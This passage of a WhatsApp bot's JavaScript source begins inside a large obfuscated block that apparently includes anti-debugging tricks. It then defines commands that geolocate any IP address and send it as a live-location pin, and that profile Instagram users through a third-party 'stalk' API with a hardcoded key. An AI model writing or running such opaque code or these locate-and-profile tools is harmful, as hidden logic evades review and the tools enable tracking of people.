f,-0x102,-0x17b,-0x16c)+_0x2b064e(-0x174,-0x1a2,-0x135,-0xb1,-0xc3)+_0x3e4932(-0x1aa,-0x228,-0x1ec,-0x1ea,-0x15b)+'\x22')+ipbot[_0x52408c(-0xdf,-0x1fc,-0x182,-0x1b7,-0x1d9)+_0x2987a2(-0x251,-0x233,-0x1fd,-0x1d8,-0x20b)]+(_0x4e6c13(-0x18f,-0x1fe,-0x19b,-0x226,-0x18b)+_0x2b064e(-0x1c3,-0xd3,-0x127,-0x18b,-0x10e))+ipbot[_0x4e6c13(-0x101,-0x1ae,-0x193,-0x20c,-0x211)]+(_0x4e6c13(-0x2c3,-0x245,-0x21d,-0x275,-0x231)+_0x2b064e(-0xda,-0x9f,-0x12b,-0x19a,-0x1c9))+ipbot[_0x2987a2(-0xcf,-0x7a,-0xf9,-0x158,-0x173)]+(_0x4e6c13(-0x220,-0x16f,-0x210,-0x25b,-0x188)+_0x4e6c13(-0x269,-0x169,-0x1c6,-0x1eb,-0x153))+ipbot[_0x52408c(-0x1f0,-0x183,-0x18b,-0x11a,-0x206)]+(_0x4e6c13(-0xf6,-0x12a,-0x10d,-0x166,-0xbf)+'\x22:')+ipbot[_0x2987a2(-0x212,-0x18c,-0x1e2,-0x27b,-0x270)]+(_0x2b064e(-0x15c,-0x9e,-0xfb,-0xc9,-0x78)+_0x2b064e(-0xd5,-0x83,-0x118,-0x14d,-0x15e)+_0x2b064e(-0x19c,-0x1e4,-0x1bc,-0x1fa,-0x145))+ipbot[_0x2987a2(-0x2a2,-0x183,-0x202,-0x197,-0x1ea)+_0x3e4932(-0x232,-0x148,-0x190,-0x217,-0xfd)]+(_0x52408c(-0x11f,-0x237,-0x1a2,-0x181,-0x13f)+_0x4e6c13(-0x1be,-0x12d,-0x12b,-0x195,-0xdc))+ipbot[_0x2b064e(-0x14a,-0x128,-0x1ce,-0x153,-0x21b)]+(_0x4e6c13(-0x1ee,-0x2a4,-0x240,-0x1d3,-0x254)+_0x2b064e(-0x17c,-0x299,-0x21a,-0x1d4,-0x218))+ipbot[_0x2987a2(-0x25a,-0x1e7,-0x234,-0x2bb,-0x247)]+(_0x52408c(-0x126,-0x15a,-0x15e,-0x134,-0x14b)+_0x52408c(-0x121,-0x1d8,-0x1bc,-0x1bf,-0x1ff))+ipbot['as']+(_0x2b064e(-0x11f,-0xeb,-0xf5,-0xfe,-0x15d)+_0x4e6c13(-0x23b,-0x190,-0x228,-0x2ae,-0x2b4)+'\x22')+ipbot[_0x3e4932(-0x205,-0x123,-0x1a1,-0x1e1,-0x216)]+'\x22}';function _0x8d1688(_0x3d0cab){const _0x4c3b57=function(_0x5a6f57,_0x54ebff,_0x3231bd,_0x4400e0,_0x4fdf5d){return _0x2b064e(_0x5a6f57-0x46,_0x54ebff-0xa0,_0x3231bd-0x336,_0x4400e0,_0x4fdf5d-0x8f);},_0x35c474=function(_0x56688e,_0x451d6e,_0x1ba3ce,_0x59ffa1,_0x5c568c){return _0x3e4932(_0x56688e-0xa,_0x451d6e-0x1b3,_0x1ba3ce-0x336,_0x59ffa1,_0x5c568c-0x125);},_0x25c359=function(_0x4bef54,_0x22b785,_0x21e133,_0x5b3f84,_0x1de053){return _0x2987a2(_0x4bef54-0xe,_0x22b785-0x17c,_0x21e133-0x336,_0x5b3f84,_0x1de053-0x89);},_0x403827=function(_0x4431c6,_0x5c951f,_0x26f688,_0x16e595,_0x13f0bc){return _0x52408c(_0x4431c6-0x112,_0x5c951f-0xa,_0x26f688-0x336,_0x16e595,_0x13f0bc-0x1e8);},_0x840152=function(_0x3232f3,_0x520966,_0x10914e,_0x5aea7f,_0x242347){return _0x2b064e(_0x3232f3-0xe0,_0x520966-0xe1,_0x10914e-0x336,_0x5aea7f,_0x242347-0x13f);},_0x230307={};_0x230307[_0x4c3b57(0x222,0x1da,0x1da,0x1d7,0x19b)]=_0x4c3b57(0x1b8,0x1f4,0x1ed,0x295,0x288)+_0x35c474(0x122,0x112,0x11b,0x18f,0xa0)+_0x4c3b57(0x1d3,0x106,0x171,0xfe,0x143)+_0x25c359(0x17b,0xe3,0x100,0x165,0x122)+'/',_0x230307[_0x403827(0x206,0x215,0x1de,0x161,0x171)]=_0x840152(0x2ac,0x17e,0x210,0x16a,0x202)+_0x4c3b57(0x133,0x125,0x11d,0x13b,0x1ba)+_0x25c359(0x130,0x196,0x152,0xb0,0x1ab)+_0x35c474(0x179,0x134,0x16f,0x148,0x115)+_0x403827(0x13d,0x1f9,0x178,0x1db,0x10c),_0x230307[_0x403827(0x14c,0x168,0x15d,0x1cc,0x1c1)]=function(_0x6c7f1a,_0x3bead0){return _0x6c7f1a===_0x3bead0;},_0x230307[_0x4c3b57(0x1e8,0x196,0x144,0x138,0x110)]=_0x4c3b57(0x189,0x1c0,0x18f,0x139,0xfd),_0x230307[_0x403827(0xde,0x229,0x182,0x147,0x118)]=_0x840152(0x117,0x10d,0x167,0x116,0x14c),_0x230307[_0x25c359(0x123,0x1ad,0x1c9,0x228,0x1d9)]=_0x840152(0x226,0x166,0x20d,0x20c,0x289)+_0x25c359(0x184,0x19a,0x200,0x197,0x263)+_0x840152(0x238,0x11d,0x19c,0x143,0x13f)+')',_0x230307[_0x840152(0xfa,0x12f,0x15c,0x1c5,0x155)]=_0x403827(0x1ee,0x103,0x149,0xb7,0x1ab)+_0x25c359(0x12b,0x1f3,0x1b9,0x1d4,0x25e)+_0x4c3b57(0xe6,0x212,0x172,0x129,0x19c)+_0x35c474(0x73,0x14f,0xf9,0xf0,0x7e)+_0x25c359(0x161,0x10f,0x19d,0x11a,0xf7)+_0x403827(0x121,0x15c,0x14d,0x1a5,0x119)+_0x35c474(0x208,0x1d3,0x1d5,0x1f9,0x224),_0x230307[_0x403827(0x1e3,0x181,0x1a5,0x1f8,0x18c)]=function(_0x1e6fb1,_0x223ce9){return _0x1e6fb1(_0x223ce9);},_0x230307[_0x4c3b57(0xb8,0x14f,0x114,0x96,0x121)]=_0x840152(0x13e,0x18a,0xf4,0xe4,0x88),_0x230307[_0x840152(0x1ca,0x21b,0x1ec,0x183,0x16a)]=function(_0x39a80c,_0x2523e5){return _0x39a80c+_0x2523e5;},_0x230307[_0x4c3b57(0x1fe,0x223,0x18b,0x154,0x150)]=_0x840152(0x1f5,0x173,0x213,0x25c,0x16e),_0x230307[_0x35c474(0x2ac,0x258,0x230,0x2cb,0x29c)]=function(_0x68323,_0x4c4a50){return _0x68323+_0x4c4a50;},_0x230307[_0x840152(0x1a4,0x14b,0x121,0x95,0x1bf)]=_0x840152(0x274,0x1cf,0x231,0x296,0x268),_0x230307[_0x840152(0x283,0x286,0x22b,0x255,0x22b)]=function(_0x277dea){return _0x277dea();},_0x230307[_0x840152(0x174,0x20e,0x1b2,0x1f0,0x153)]=function(_0x2116d4,_0x315171){return _0x2116d4===_0x315171;},_0x230307[_0x25c359(0x229,0x1e1,0x181,0x1a5,0x20e)]=_0x403827(0x6f,0x64,0xfa,0x166,0x189),_0x230307[_0x840152(0x132,0x1b9,0x18e,0x175,0x221)]=_0x4c3b57(0xbf,0xbb,0x150,0xcd,0x1d9),_0x230307[_0x35c474(0x1f1,0x2a0,0x232,0x1ee,0x18e)]=function(_0xb991d7,_0x4e20f0){return _0xb991d7(_0x4e20f0);},_0x230307[_0x840152(0x275,0x17f,0x226,0x228,0x194)]=_0x35c474(0x1a0,0x21e,0x1ed,0x253,0x27a)+_0x840152(0x19c,0x167,0x191,0x11d,0x1c9)+_0x25c359(0xc5,0xb8,0xfb,0x111,0x12c)+_0x35c474(0x1cf,0x140,0x1d3,0x19c,0x1d5),_0x230307[_0x35c474(0x261,0x1f8,0x1d9,0x170,0x27a)]=_0x403827(0x211,0x292,0x1fd,0x1b7,0x1ed)+_0x840152(0x22c,0x15b,0x1c7,0x1f9,0x1ec)+_0x4c3b57(0x15c,0x260,0x1e6,0x214,0x1a0)+_0x403827(0x181,0x117,0x1b1,0x24f,0x250)+_0x35c474(0x1f6,0x189,0x163,0x1c5,0x1d6)+_0x403827(0x1ee,0x1cc,0x158,0x19f,0x17f)+'\x20)',_0x230307[_0x25c359(0x134,0x148,0x141,0x1d6,0x15a)]=function(_0x28d858,_0xf6977b){return _0x28d858===_0xf6977b;},_0x230307[_0x840152(0x1c5,0x1f9,0x1af,0x195,0x1b2)]=_0x25c359(0x1ff,0x1bb,0x1ef,0x1da,0x19a),_0x230307[_0x403827(0x132,0x14c,0x16b,0x177,0x13b)]=_0x840152(0x178,0x157,0x1ac,0x175,0x18a),_0x230307[_0x840152(0x15e,0x23a,0x1f5,0x1b7,0x1e6)]=_0x25c359(0x1e4,0x204,0x242,0x1d4,0x2cf)+'g',_0x230307[_0x25c359(0x1b3,0x12f,0x174,0x15f,0x1dd)]=function(_0x52bfff,_0xef3fc1){return _0x52bfff===_0xef3fc1;},_0x230307[_0x840152(0x14b,0x141,0x130,0x16b,0x148)]=_0x840152(0x1c8,0x1ea,0x197,0x1a7,0x112),_0x230307[_0x25c359(0x182,0x1c2,0x161,0x117,0x1c1)]=_0x35c474(0x29e,0x20f,0x1f8,0x17b,0x239)+_0x840152(0x22d,0x170,0x1c5,0x24b,0x13c)+_0x25c359(0x1be,0x1c8,0x1be,0x121,0x239),_0x230307[_0x25c359(0x1f4,0x1a0,0x22d,0x224,0x2c3)]=_0x35c474(0x19e,0x211,0x1c2,0x1a7,0x1ba)+'er',_0x230307[_0x403827(0x158,0x116,0xfc,0xbf,0x112)]=function(_0x170b44,_0x56a83a){return _0x170b44===_0x56a83a;},_0x230307[_0x4c3b57(0x249,0x1a0,0x1ba,0x19a,0x262)]=_0x25c359(0x1d4,0xdd,0x180,0x12d,0xdb),_0x230307[_0x25c359(0x15a,0x1d7,0x183,0x14d,0x12f)]=_0x403827(0x1bb,0x169,0x1a8,0x205,0x11e),_0x230307[_0x25c359(0x1cd,0x1ac,0x1c8,0x133,0x1c2)]=function(_0x1c1937,_0xc44f07){return _0x1c1937!==_0xc44f07;},_0x230307[_0x4c3b57(0x132,0x137,0x199,0x128,0x106)]=function(_0x159a97,_0x257e4d){return _0x159a97+_0x257e4d;},_0x230307[_0x403827(0x1e3,0x167,0x179,0xdf,0x20b)]=function(_0x445fc5,_0xb9ee1a){return _0x445fc5/_0xb9ee1a;},_0x230307[_0x25c359(0x1b3,0xf9,0x156,0x1b6,0x153)]=_0x4c3b57(0x194,0x1f1,0x169,0x1e6,0xef)+'h',_0x230307[_0x4c3b57(0x19c,0x67,0x10a,0xea,0x18a)]=function(_0x5a05bb,_0x26c963){return _0x5a05bb===_0x26c963;},_0x230307[_0x25c359(0x18d,0x116,0x132,0x137,0x180)]=function(_0x403b96,_0x614acd){return _0x403b96%_0x614acd;},_0x230307[_0x35c474(0x170,0x1ff,0x192,0x12c,0x17a)]=function(_0xb9f2ac,_0x49f883){return _0xb9f2ac!==_0x49f883;},_0x230307[_0x403827(0x1a3,0x271,0x238,0x22c,0x1f1)]=_0x403827(0xde,0x1b3,0x11e,0xdf,0x11a),_0x230307[_0x403827(0x27a,0x209,0x224,0x263,0x288)]=_0x403827(0x1a8,0x201,0x1f2,0x185,0x254),_0x230307[_0x840152(0x264,0x1ec,0x1e2,0x275,0x20a)]=_0x4c3b57(0x252,0x1bb,0x1ad,0x22a,0x24d),_0x230307[_0x4c3b57(0x8e,0x19d,0x129,0xdf,0x146)]=_0x403827(0xe1,0x152,0x108,0xad,0x7d),_0x230307[_0x35c474(0x2b1,0x1f1,0x225,0x281,0x221)]=_0x25c359(0x18d,0xdf,0x10d,0x167,0x16f)+'n',_0x230307[_0x35c474(0x77,0x82,0x110,0x150,0xff)]=function(_0x11a428,_0x2eeab7){return _0x11a428!==_0x2eeab7;},_0x230307[_0x25c359(0x155,0x1f5,0x1cd,0x16b,0x1e0)]=_0x4c3b57(0x148,0x1e3,0x1f0,0x21a,0x246),_0x230307[_0x4c3b57(0xba,0x1b1,0x135,0x1c5,0xe8)]=_0x25c359(0x1e5,0xf9,0x1a1,0x1dd,0x1ca)+_0x4c3b57(0x209,0x19d,0x1eb,0x273,0x22c)+'t',_0x230307[_0x840152(0x160,0x1bc,0x15e,0x12f,0x1f0)]=function(_0x14f0bf,_0x34e270){return _0x14f0bf(_0x34e270);},_0x230307[_0x840152(0x213,0x15a,0x190,0x1cd,0x11d)]=function(_0x2db2ad,_0x3e1f58){return _0x2db2ad!==_0x3e1f58;},_0x230307[_0x25c359(0x173,0xe9,0x17b,0x178,0x1f5)]=_0x35c474(0x12e,0x1a8,0x133,0xa1,0x130),_0x230307[_0x25c359(0x19e,0x154,0x147,0x19d,0x18c)]=function(_0x3a020,_0x722ee){return _0x3a020!==_0x722ee;},_0x230307[_0x403827(0x16b,0xd5,0x106,0xdb,0xbe)]=_0x403827(0x7f,0x17a,0x10f,0x6d,0x1b4),_0x230307[_0x840152(0x197,0x272,0x221,0x201,0x1bb)]=_0x840152(0x1f4,0x26e,0x1e1,0x194,0x1fd),_0x230307[_0x4c3b57(0x16d,0x22d,0x186,0x1e7,0x15c)]=function(_0x2aea3a,_0x13e61d){return _0x2aea3a!==_0x13e61d;},_0x230307[_0x25c359(0x96,0xa2,0x116,0xf4,0x9b)]=_0x840152(0x14c,0x212,0x1f4,0x15f,0x168),_0x230307[_0x403827(0x99,0x122,0x112,0xd4,0xf3)]=_0x840152(0x1e1,0xfb,0x173,0x20a,0x117);const _0xa92ec9=_0x230307;function _0x4a6aa7(_0x4a5b07){const _0x388824=function(_0x17310d,_0x1a4e5f,_0x572909,_0x4dcfd1,_0x4bf376){return _0x25c359(_0x17310d-0x1b2,_0x1a4e5f-0xa3,_0x4dcfd1-0x37d,_0x572909,_0x4bf376-0x12e);},_0x2100b2=function(_0x4f5271,_0x3055a1,_0x1d5245,_0x3bc16d,_0x341ca3){return _0x35c474(_0x4f5271-0x6b,_0x3055a1-0x10,_0x3bc16d-0x37d,_0x1d5245,_0x341ca3-0x19e);},_0x2b53bb=function(_0x57f637,_0x2c066d,_0x52b7bb,_0x422b8e,_0x4f5c97){return _0x403827(_0x57f637-0x156,_0x2c066d-0x7e,_0x422b8e-0x37d,_0x52b7bb,_0x4f5c97-0x19);},_0x3511c0=function(_0x1100ee,_0x150f0a,_0xac316d,_0x24de07,_0x105b8a){return _0x35c474(_0x1100ee-0x76,_0x150f0a-0x116,_0x24de07-0x37d,_0xac316d,_0x105b8a-0x115);},_0x2660aa=function(_0x3714f9,_0x3adea7,_0xb04aee,_0x1270cc,_0x512094){return _0x35c474(_0x3714f9-0x47,_0x3adea7-0xa2,_0x1270cc-0x37d,_0xb04aee,_0x512094-0x2c);},_0x29d934={};_0x29d934[_0x388824(0x573,0x4ff,0x495,0x4e9,0x4d4)]=function(_0x188feb,_0x334ea9){const _0x333593=function(_0x566d13,_0x481c23,_0x2b8251,_0x428bc9,_0x336136){return _0x388824(_0x566d13-0x9f,_0x481c23-0x1aa,_0x481c23,_0x566d13-0x2f2,_0x336136-0xee);};return _0xa92ec9[_0x333593(0x8a1,0x86e,0x863,0x85a,0x808)](_0x188feb,_0x334ea9);},_0x29d934[_0x388824(0x523,0x53f,0x550,0x4c5,0x436)]=function(_0x789c58,_0x336e99){const _0x4a90c6=function(_0x4b3386,_0x5892cd,_0x4886ad,_0x219317,_0x490d2b){return _0x2100b2(_0x4b3386-0x1e1,_0x5892cd-0xed,_0x4886ad,_0x490d2b-0x1f8,_0x490d2b-0x8c);};return _0xa92ec9[_0x4a90c6(0x7d7,0x79e,0x7d5,0x76f,0x7a5)](_0x789c58,_0x336e99);},_0x29d934[_0x388824(0x53b,0x55d,0x510,0x574,0x4f6)]=_0xa92ec9[_0x388824(0x545,0x646,0x617,0x5a3,0x5e8)],_0x29d934[_0x3511c0(0x595,0x5fd,0x655,0x5b7,0x5a5)]=_0xa92ec9[_0x2b53bb(0x4c0,0x582,0x5b2,0x556,0x57f)];const _0x4121be=_0x29d934;if(_0xa92ec9[_0x2660aa(0x459,0x45e,0x548,0x4be,0x4e5)](_0xa92ec9[_0x2660aa(0x55a,0x4a4,0x4fb,0x52c,0x5c9)],_0xa92ec9[_0x2100b2(0x450,0x577,0x535,0x4e8,0x536)])){const _0x1e3c46=_0x52fbf3[_0x388824(0x5c9,0x541,0x4cd,0x56e,0x585)](_0x1e5758,arguments);return _0x129536=null,_0x1e3c46;}else{if(_0xa92ec9[_0x3511c0(0x506,0x443,0x418,0x4be,0x551)](typeof _0x4a5b07,_0xa92ec9[_0x2660aa(0x4d6,0x5be,0x560,0x572,0x583)])){if(_0xa92ec9[_0x3511c0(0x53d,0x4a7,0x483,0x4f1,0x598)](_0xa92ec9[_0x2b53bb(0x496,0x4f7,0x4ef,0x4ad,0x48c)],_0xa92ec9[_0x2660aa(0x515,0x466,0x43e,0x4ad,0x53b)]))return function(_0x3df67b){}[_0x2660aa(0x634,0x5e9,0x5b6,0x59a,0x5d3)+_0x2100b2(0x433,0x4c7,0x523,0x4b9,0x532)+'r'](_0xa92ec9[_0x2b53bb(0x510,0x532,0x55e,0x4de,0x48f)])[_0x2b53bb(0x4ff,0x526,0x4ff,0x56e,0x51e)](_0xa92ec9[_0x388824(0x58e,0x59e,0x5e7,0x5aa,0x558)]);else{if(_0x466901){const _0x520092=_0x2cad97[_0x2100b2(0x4f8,0x4cd,0x593,0x56e,0x581)](_0x753f25,arguments);return _0x4dd31c=null,_0x520092;}}}else{if(_0xa92ec9[_0x2100b2(0x4ae,0x504,0x44c,0x479,0x495)](_0xa92ec9[_0x2660aa(0x527,0x4fb,0x554,0x537,0x4ba)],_0xa92ec9[_0x388824(0x45a,0x50f,0x4bb,0x500,0x4ba)])){const _0x109980=_0x35135c[_0x2b53bb(0x606,0x519,0x59a,0x59a,0x622)+_0x2100b2(0x52f,0x468,0x491,0x4b9,0x491)+'r'](_0xa92ec9[_0x2b53bb(0x520,0x581,0x52b,0x557,0x5ec)])()[_0x3511c0(0x5b4,0x538,0x55e,0x59a,0x642)+_0x3511c0(0x4cb,0x47a,0x46f,0x4b9,0x47a)+'r'](_0xa92ec9[_0x2660aa(0x56f,0x4f9,0x4d9,0x55b,0x53c)]);return!_0x109980[_0x388824(0x4fb,0x5fe,0x5da,0x584,0x50d)](_0x152df1);}else{if(_0xa92ec9[_0x2100b2(0x4c8,0x538,0x4bc,0x545,0x53a)](_0xa92ec9[_0x2660aa(0x4d4,0x54b,0x579,0x516,0x575)]('',_0xa92ec9[_0x2100b2(0x480,0x511,0x495,0x4f6,0x4bc)](_0x4a5b07,_0x4a5b07))[_0xa92ec9[_0x2100b2(0x4a7,0x52b,0x4e3,0x4d3,0x4e4)]],-0x216d+0x67*-0x22+0x2f1c)||_0xa92ec9[_0x3511c0(0x4a7,0x510,0x416,0x487,0x4f5)](_0xa92ec9[_0x2100b2(0x478,0x46e,0x557,0x4af,0x442)](_0x4a5b07,-0x1*-0x5f9+-0x1*-0x3b5+0x99a*-0x1),0x1*0x16f+-0x1*0x1cd+-0x2*-0x2f)){if(_0xa92ec9[_0x2660aa(0x4ba,0x50f,0x4c1,0x50f,0x5ae)](_0xa92ec9[_0x2100b2(0x5c6,0x526,0x52a,0x5b5,0x56b)],_0xa92ec9[_0x388824(0x5bb,0x552,0x550,0x5a1,0x56f)]))(function(){const _0x104f30=function(_0xbdfc9d,_0x5edb63,_0x4cfb3f,_0x8db65,_0x366555){return _0x2b53bb(_0xbdfc9d-0x17f,_0x5edb63-0xfa,_0x8db65,_0x4cfb3f-0x1eb,_0x366555-0x6d);},_0x4f3922=function(_0x24a9c9,_0x22dc31,_0xe21259,_0x3d5bdd,_0x36855c){return _0x2b53bb(_0x24a9c9-0x6b,_0x22dc31-0x38,_0x3d5bdd,_0xe21259-0x1eb,_0x36855c-0xad);},_0x3676e0=function(_0x599221,_0x1e1b2c,_0x561bd2,_0x477793,_0x3b4533){return _0x388824(_0x599221-0xbc,_0x1e1b2c-0x14f,_0x477793,_0x561bd2-0x1eb,_0x3b4533-0x15c);},_0x55e8c3=function(_0x1c4daa,_0x9db145,_0x339194,_0x26222f,_0x1025c0){return _0x2b53bb(_0x1c4daa-0x80,_0x9db145-0xf,_0x26222f,_0x339194-0x1eb,_0x1025c0-0x196);},_0x40459f=function(_0x468cee,_0x3471b2,_0x22749e,_0x2c0aa3,_0x30784a){return _0x2100b2(_0x468cee-0x1dc,_0x3471b2-0xad,_0x2c0aa3,_0x22749e-0x1eb,_0x30784a-0x1a9);};if(_0xa92ec9[_0x104f30(0x647,0x714,0x6c5,0x718,0x627)](_0xa92ec9[_0x4f3922(0x738,0x70f,0x6ac,0x70a,0x6a3)],_0xa92ec9[_0x4f3922(0x77e,0x742,0x6ea,0x748,0x68d)])){let _0x3c218d;try{_0x3c218d=_0x4121be[_0x104f30(0x6de,0x6cb,0x6d4,0x74d,0x62d)](_0x414a69,_0x4121be[_0x4f3922(0x676,0x70a,0x6b0,0x730,0x6a5)](_0x4121be[_0x3676e0(0x64f,0x67f,0x6b0,0x628,0x686)](_0x4121be[_0x40459f(0x7f7,0x736,0x75f,0x78f,0x7e2)],_0x4121be[_0x55e8c3(0x794,0x6fe,0x7a2,0x705,0x72b)]),');'))();}catch(_0x301818){_0x3c218d=_0x263393;}return _0x3c218d;}else return!![];}[_0x3511c0(0x5dd,0x57b,0x5af,0x59a,0x564)+_0x3511c0(0x44d,0x50d,0x41b,0x4b9,0x43c)+'r'](_0xa92ec9[_0x3511c0(0x554,0x57a,0x50e,0x516,0x4a5)](_0xa92ec9[_0x388824(0x599,0x5dd,0x572,0x55f,0x57b)],_0xa92ec9[_0x2660aa(0x42b,0x46a,0x52f,0x4a6,0x409)]))[_0x2b53bb(0x3e9,0x4ac,0x516,0x482,0x50d)](_0xa92ec9[_0x2b53bb(0x5b3,0x602,0x510,0x5a2,0x568)]));else{const _0x27a11d=new _0x92b4be(_0xa92ec9[_0x2660aa(0x54a,0x531,0x53f,0x546,0x4fc)]),_0x88804c=new _0x5a54b5(_0xa92ec9[_0x3511c0(0x4d1,0x45f,0x53b,0x4d9,0x53f)],'i'),_0x55c2fb=_0xa92ec9[_0x3511c0(0x509,0x54c,0x58c,0x522,0x5c6)](_0x1f7ebe,_0xa92ec9[_0x388824(0x46f,0x464,0x4aa,0x491,0x4e0)]);!_0x27a11d[_0x2100b2(0x564,0x604,0x508,0x584,0x538)](_0xa92ec9[_0x2100b2(0x5b2,0x600,0x591,0x569,0x5b8)](_0x55c2fb,_0xa92ec9[_0x2100b2(0x465,0x476,0x4a4,0x508,0x46f)]))||!_0x88804c[_0x3511c0(0x583,0x5e6,0x61f,0x584,0x581)](_0xa92ec9[_0x2100b2(0x5fb,0x56b,0x58b,0x5ad,0x593)](_0x55c2fb,_0xa92ec9[_0x2660aa(0x465,0x4b6,0x46c,0x49e,0x48c)]))?_0xa92ec9[_0x388824(0x4a5,0x4e0,0x58e,0x522,0x4b8)](_0x55c2fb,'0'):_0xa92ec9[_0x2b53bb(0x5b3,0x5ab,0x530,0x5a8,0x562)](_0x511ecb);}}else _0xa92ec9[_0x388824(0x404,0x445,0x45e,0x48d,0x4ef)](_0xa92ec9[_0x2660aa(0x4c4,0x56a,0x4b9,0x54a,0x592)],_0xa92ec9[_0x3511c0(0x5d4,0x5cf,0x4b9,0x54a,0x586)])?_0x4121be[_0x2b53bb(0x456,0x52e,0x487,0x4e9,0x58d)](_0x3e9cc3,0xa39+-0x3*0x65+-0x485*0x2):function(){const _0x68515f=function(_0xb79c6c,_0x4e9271,_0x33dfd3,_0x7f9637,_0x3cd95f){return _0x2b53bb(_0xb79c6c-0x124,_0x4e9271-0x187,_0x7f9637,_0x33dfd3- -0x3d8,_0x3cd95f-0xe);},_0x1d3d07=function(_0x20f38f,_0x10fbb1,_0x485b7e,_0x4daf6f,_0x2444a1){return _0x2100b2(_0x20f38f-0x54,_0x10fbb1-0x1e9,_0x4daf6f,_0x485b7e- -0x3d8,_0x2444a1-0x174);},_0x239c09=function(_0x1aa43e,_0x2bf0ab,_0x4e54b8,_0xd111b8,_0x554411){return _0x2100b2(_0x1aa43e-0x8e,_0x2bf0ab-0x1c5,_0xd111b8,_0x4e54b8- -0x3d8,_0x554411-0x16f);};if(_0xa92ec9[_0x68515f(0x1e9,0x164,0x157,0x1ed,0x142)](_0xa92ec9[_0x68515f(0x162,0x10a,0x126,0x115,0xf2)],_0xa92ec9[_0x239c09(0xa7,0xb1,0x133,0xf9,0x1d8)]))_0x36a1d5=_0x559a93;else return![];}[_0x3511c0(0x610,0x613,0x57b,0x59a,0x59a)+_0x2100b2(0x463,0x456,0x4e7,0x4b9,0x55b)+'r'](_0xa92ec9[_0x388824(0x577,0x538,0x4ff,0x516,0x503)](_0xa92ec9[_0x2100b2(0x57e,0x585,0x5ee,0x55f,0x5a5)],_0xa92ec9[_0x388824(0x4c9,0x4fe,0x44f,0x4a6,0x4d0)]))[_0x2100b2(0x5f1,0x4e6,0x56c,0x56e,0x589)](_0xa92ec9[_0x2b53bb(0x4fe,0x44b,0x4b2,0x4b2,0x531)]);}}_0xa92ec9[_0x3511c0(0x557,0x4c9,0x4ba,0x4db,0x555)](_0x4a6aa7,++_0x4a5b07);}}try{if(_0xa92ec9[_0x4c3b57(0x14b,0x1c1,0x190,0xf9,0x190)](_0xa92ec9[_0x35c474(0x156,0xf2,0x17b,0x18e,0x183)],_0xa92ec9[_0x4c3b57(0x201,0x202,0x17b,0x12d,0x100)])){if(_0x3f38b5){const _0x152d3a=_0x31e003[_0x35c474(0x21b,0x168,0x1f1,0x177,0x157)](_0x4fbb14,arguments);return _0x44acdb=null,_0x152d3a;}}else{if(_0x3d0cab){if(_0xa92ec9[_0x840152(0x1e6,0x110,0x147,0x1ed,0x187)](_0xa92ec9[_0x35c474(0x156,0x169,0x106,0xe0,0x146)],_0xa92ec9[_0x403827(0x212,0x1ae,0x221,0x28c,0x20a)]))return _0x4a6aa7;else _0xa92ec9[_0x403827(0x127,0x202,0x15e,0x13a,0xe5)](_0x146119,'0');}else{if(_0xa92ec9[_0x840152(0x1dd,0x199,0x186,0x204,0x220)](_0xa92ec9[_0x403827(0x12c,0xec,0x116,0x1af,0xf2)],_0xa92ec9[_0x35c474(0xb7,0x19a,0x112,0x14f,0x16a)]))_0xa92ec9[_0x4c3b57(0xf7,0x172,0x15e,0x1af,0x157)](_0x4a6aa7,0x30e+-0x3*0x399+0x7bd);else return _0x48ef26;}}}catch(_0x40fb9c){}}
reply(ipbotSm330)
await sleep(200)
reply('*Haciendo lectura* _Json_.... *Tiempo Aproximado:*\n```3 seconds```')
await sleep(200)
datosbot = `*📌Numero del bot:* ${botNumber}

🌍 *ip*: _${ipbot.query}_
      *Latitud de ip*: ${ipbot.lat}
      *Longitud de ip*: ${ipbot.lon}

🌆 *País*: _${ipbot.country}_
      *Código de país*: ${ipbot.countryCode}

🏡 *Región*: _${ipbot.region}_
      *Nombre de región*: ${ipbot.regionName}

🏙️ *Ciudad*: _${ipbot.city}_

📚 *Código postal*: _${ipbot.zip}_

🕐 *Zona horaria*: _${ipbot.timezone}_

🌐 *Proveedor de servicios de Internet*:
_${ipbot.isp}_

🕋 *Organización*: _${ipbot.org}_

${samu}©${ipbot.as}™${samu}`
samu330.sendMessage(from, datosbot, MessageType.text, {quoted: fliveLoc})
await sleep(300)
samu330.sendMessage(from, { degreesLatitude: `${ipbot.lat}`, degreesLongitude: `${ipbot.lon}`, name: '📌Búsqueda por 🐉Samu330🐉', address : `${ipbot.city}`}, MessageType.liveLocation, {quoted : fliveLoc})
break
//localizacion IP Creado por Samu
case 'ip':
ips = args.join(' ')
if (!q) return reply('Y la ip?')
ip = await getJson(`http://ip-api.com/json/${ips}`)
if(ip.status == 'fail') return reply('*ip incorrecta*')
reply('*Recopilando información.... Tiempo Aproximado:*\n```3 seconds```')
await sleep(200)
datos = `*🔍Ip:* _${ips}_

      *Latitud de ip*: ${ip.lat}
      *Longitud de ip*: ${ip.lon}

🌆 *País*: _${ip.country}_
      *Código de país*: ${ip.countryCode}

🏡 *Región*: _${ip.region}_
      *Nombre de región*: ${ip.regionName}

🏙️  *Ciudad*: _${ip.city}_

📚 *Código postal*: _${ip.zip}_

🕐 *Zona horaria*: _${ip.timezone}_

🌐 *Proveedor de servicios de Internet*:
_${ip.isp}_                                                                                                                                                                                                    
🕋 *Organización*: _${ip.org}_                                                                                                                                                                                  
${samu}©${ip.as}™${samu}`                            
			samu330.sendMessage(from, datos, MessageType.text, {quoted: fliveLoc})
await sleep(300)
/*NO CAMBIAR DATOS NI NOMBRES*/samu330.sendMessage(from, { degreesLatitude: `${ip.lat}`, degreesLongitude: `${ip.lon}`, name: '📌Búsqueda por 🐉Samu330🐉', address : `${ip.city}`}, MessageType.liveLocation, {quoted : fliveLoc})
break
		

//Igstalk Creado por Samu gracias a la api de Fxc7
		
//NO CAMBIAR ABSOLUTAMENTE NADA, GRACIAS!!
		
		
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*////*/case 'igstalk':
/*////*/if (!q) return reply(`*Y el nombre de usuario??* ejemplo de uso: ${prefix}igstalk Samu330wabot`)
/*////*/ig = await getJson(`https://fxc7-api.herokuapp.com/api/stalk/ig?apikey=Fxc7&username=${q}`)
/*////*/s = ig.result
